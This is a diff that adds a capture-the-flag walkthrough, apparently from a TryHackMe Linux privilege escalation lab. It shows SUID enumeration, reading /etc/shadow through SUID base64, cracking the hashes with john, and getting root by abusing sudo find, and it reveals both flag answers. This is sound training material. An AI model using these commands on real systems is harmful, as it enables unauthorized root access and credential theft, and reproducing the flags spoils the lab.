@@ -282,3 +282,51 @@ int main()
 
 ## Capstone Challenge
 
+### What is the content of the flag1.txt file?
+
+#### Try common privilege escalation vectors
+
+- `sudo -l` to list binaries that can be run as super user by *leonard*
+    - No results found
+- `find / -type f -perm -04000 -ls 2>/dev/null` to search for files with the SUID bit set
+    - `2>/dev/null` pipes error output to null (without root, this command will produce a lot of errors)
+    - The first listing of many: `16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64`
+    - Cross reference results with [GTFOBins](https://gtfobins.github.io/gtfobins/base64/)
+
+#### Abuse SUID bit to gain a foothold
+
+- The behavior of *base64* with the SUID bit is that converting a file to base64 then back lets you read files that otherwise require elevated permissions
+    - What are some sensitive files on linux systems?
+        - */etc/passwd* contains user list
+        - */etc/shadow* contains password hashes
+        - With both the passwd and shadow files from a machine, the password hashes can be cracked
+- `base64 /etc/passwd | base64 --decode` to see /etc/passwd
+- `base64 /etc/shadow | base64 --decode` to see /etc/shadow
+- Can either pipe outputs to files, and serve to attack machine with http server (`python3 -m http.server <port>`) or copy base64 and decode on attack machine
+    - If copying base64, remember to `sha256sum` the file before and after to confirm integrity
+
+#### Cracking system passwords
+
+- `unshadow passwd shadow > hash` to pipe crackable hashes to a file called "hash"
+- `john hash --wordlist=/usr/share/wordlist/rockyou.txt` to crack the hashes against the rockyou wordlist
+    - May need to `sudo gunzip /usr/share/wordlist/rockyou.txt.gz` first
+- Unique password combination returned:
+    - User: **missy**
+    - Pass: **Password1**
+
+#### Lateral Escalation
+
+- `ssh missy@<target ip>` with the newly discovered credentials
+- Repeat enumeration process
+    - `sudo -l` shows that *missy* can run **find** as sudo with no password
+- Cross-reference [GTFOBins](https://gtfobins.github.io/gtfobins/find/) which gives this snippet: `sudo find . -exec /bin/sh \; -quit` as a way to gain root when *find* can be run as sudo
+
+#### Pillage
+
+- Now as root, `find / -name "flag1.txt"` and `find / -name "flag2.txt"` to locate both flags
+
+> <details><summary><code>cat /home/missy/Documents/flag1.txt</code> to get the first flag </summary>THM-42828719920544</details>
+
+### What is the content of the flag2.txt file?
+
+> <details><summary><code>cat /home/rootflag/flag2.txt</code> to get the second flag </summary>THM-168824782390238</details>
